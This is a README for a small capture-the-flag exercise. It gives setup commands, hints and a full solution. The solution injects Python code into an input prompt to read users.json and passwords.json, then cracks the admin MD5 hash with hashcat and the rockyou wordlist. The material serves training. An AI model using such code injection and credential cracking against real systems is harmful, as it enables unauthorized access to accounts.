# To get started

run this command:
```shell
git clone https://github.com/HaavardVS/CTF.git && cd CTF && cd test && clear && python3 main.py
```

if you exit, and want to try again, enter this command:

```shell
python3 main.py
```
*scroll down for hints*

---




##### Hints:
.
.
.
.
.
.
.
.
.
1. Maybe some of the users name is Jason.
.
.
.
.
.
.
.
.
.
2. I must admint there are many users.
.
.
.
.
.
.
.
.
.
3. what do you get if you give a markdown file a high five?
.
.
.
.
.
.
.
.
.
Scroll down for solution
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
##### Solution:

1. enter this string in the user input:
```python
print(open('users.json').read()); print(username)
```
this will print out all the users. Find the admin user.


2. enter this string in the user input:
```python
print(open('passwords.json').read()); print(username)
```
this will print out all the hashed passwords for the users. Find the admin hash.


3. Dehash the admin hash. Here is an example using hashcat:
```shell
hashcat -m 0 -a 0 -o cracked.txt 21232f297a57a5a743894a0e4a801fc3 /usr/share/wordlists/rockyou.txt.gz | cat cracked.txt
```
